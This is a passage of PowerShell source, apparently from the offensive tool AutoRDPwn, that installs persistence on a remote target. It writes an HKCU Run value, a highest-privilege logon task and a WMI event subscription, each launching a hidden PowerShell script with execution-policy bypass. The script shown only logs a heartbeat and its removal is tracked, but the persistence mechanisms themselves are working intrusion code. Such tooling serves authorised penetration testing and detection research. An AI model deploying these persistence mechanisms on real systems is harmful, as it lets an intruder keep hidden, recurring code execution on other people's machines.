        if ($removed -gt 0) { Write-ARSuccess ('Persistence removed: ' + $removed + ' artifact(s)') }
        else { Write-ARInfo 'No AutoRDPwn persistence artifacts found.' }
        Set-ARStatus 'Persistence removal finished' 'Ok'
        return
    }

    # One heartbeat payload, three activation roads: HKCU run value, logon
    # task and WMI subscription. The payload writes one timestamp every 300 s
    # and exits after 288 iterations; no dial-back address, no listener, and
    # every name is random per run so removal stays unique to this session.
    $payloadScript = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName '.ps1')
    $heartbeatLog = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName '.log')
    $runName = 'ARDP_' + (New-ARModuleToken -Length 6)
    $taskName = 'AutoRDPwn' + (New-ARModuleToken -Length 6)
    $filterName = 'AutoRDPwnF' + (New-ARModuleToken -Length 6)
    $consumerName = 'AutoRDPwnC' + (New-ARModuleToken -Length 6)
    $commandLine = 'powershell.exe -nop -w hidden -ep bypass -f "' + $payloadScript + '"'
    $template = @'
$ErrorActionPreference = 'SilentlyContinue'
$log = '__LOGPATH__'
for ($i = 0; $i -lt 288; $i++) {
    try {
        [System.IO.File]::AppendAllText($log, ('[' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '] AutoRDPwn heartbeat alive' + "`r`n"), [System.Text.Encoding]::UTF8)
    }
    catch { }
    Start-Sleep -Seconds 300
}
'@
    $work = New-ARWorkDirectory
    $localPayload = Join-Path $work 'heartbeat.ps1'
    [System.IO.File]::WriteAllText($localPayload, $template.Replace('__LOGPATH__', $heartbeatLog), [System.Text.Encoding]::UTF8)
    Copy-ARFileToTarget -LocalPath $localPayload -RemotePath $payloadScript | Out-Null
    if (-not $script:ARModuleFiles.Contains($payloadScript)) { $script:ARModuleFiles.Add($payloadScript) }
    if (-not $script:ARModuleFiles.Contains($heartbeatLog)) { $script:ARModuleFiles.Add($heartbeatLog) }

    $existingValue = $null
    $existedBackup = $false
    $oldValueText = ''
    $oldKind = 'String'
    try {
        $existingValue = Invoke-ARTargetCommand -ScriptBlock {
            param($key, $name)
            $registryItem = Get-Item -LiteralPath $key -ErrorAction SilentlyContinue
            if ($null -eq $registryItem) { return $null }
            $prior = $registryItem.GetValue($name)
            if ($null -eq $prior) { return $null }
            return @{ Value = [string]$prior; Kind = $registryItem.GetValueKind($name).ToString() }
        } -ArgumentList $runKey, $runName
    }
    catch { }
    if ($null -ne $existingValue) {
        $existedBackup = $true
        $oldValueText = [string]$existingValue.Value
        $oldKind = [string]$existingValue.Kind
    }
    # Recorded BEFORE the write, in the exact shape the session cleanup replays.
    $script:ARRegistryBackup.Add([pscustomobject]@{
        KeyPath = $runKey
        Name = $runName
        Existed = $existedBackup
        Value = $oldValueText
        Kind = $oldKind
    })
    try {
        Invoke-ARTargetCommand -ScriptBlock {
            param($key, $name, $command)
            New-ItemProperty -Path $key -Name $name -Value $command -PropertyType String -Force | Out-Null
        } -ArgumentList $runKey, $runName, $commandLine | Out-Null
        $script:ARPersistenceItems.Add([pscustomobject]@{ Kind = 'Run'; Name = $runName; Detail = ('script: ' + $payloadScript + '; log: ' + $heartbeatLog) })
        Write-ARSuccess ('Run value created: ' + $runName)
    }
    catch { Write-ARWarn ('Run value could not be created: ' + $_.Exception.Message) }

    $userTarget = [string]$script:ARTarget['User']
    try {
        Invoke-ARTargetCommand -ScriptBlock {
            param($name, $payloadPath, $userName)
            $userId = $userName
            if ($userId -and $userId -notmatch '\\') { $userId = $env:COMPUTERNAME + '\' + $userId }
            if ([string]::IsNullOrWhiteSpace($userId)) { $userId = $env:USERDOMAIN + '\' + $env:USERNAME }
            $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ('-nop -w hidden -ep bypass -f "' + $payloadPath + '"')
            $principal = New-ScheduledTaskPrincipal -UserId $userId -LogonType Interactive -RunLevel Highest
            $trigger = New-ScheduledTaskTrigger -AtLogOn -User $userId
            Register-ScheduledTask -TaskName $name -Action $action -Principal $principal -Trigger $trigger -Force -ErrorAction Stop | Out-Null
        } -ArgumentList $taskName, $payloadScript, $userTarget | Out-Null
        $script:ARRemoteTasks.Add($taskName)
        $script:ARPersistenceItems.Add([pscustomobject]@{ Kind = 'Task'; Name = $taskName; Detail = ('script: ' + $payloadScript) })
        Write-ARSuccess ('Logon task created: ' + $taskName)
    }
    catch { Write-ARWarn ('Logon task could not be created: ' + $_.Exception.Message) }

    try {
        Invoke-ARTargetCommand -ScriptBlock {
            param($filter, $consumer, $command)
            $bootTrigger = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpDownStatus = 1"
            $filterObject = Set-WmiInstance -Namespace 'root\subscription' -Class '__EventFilter' -Arguments @{ Name = $filter; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = $bootTrigger } -ErrorAction Stop
            $consumerObject = Set-WmiInstance -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -Arguments @{ Name = $consumer; CommandLineTemplate = $command } -ErrorAction Stop
            $null = Set-WmiInstance -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -Arguments @{ Filter = $filterObject; Consumer = $consumerObject } -ErrorAction Stop
        } -ArgumentList $filterName, $consumerName, $commandLine | Out-Null
        $script:ARPersistenceItems.Add([pscustomobject]@{ Kind = 'Wmi'; Name = $filterName; Detail = ('filter: ' + $filterName + '; consumer: ' + $consumerName + '; script: ' + $payloadScript) })
        Write-ARSuccess ('WMI subscription created: ' + $filterName + ' / ' + $consumerName)
    }
    catch { Write-ARWarn ('WMI subscription could not be created: ' + $_.Exception.Message) }

    Set-ARStatus 'Persistence kit installed' 'Ok'
}
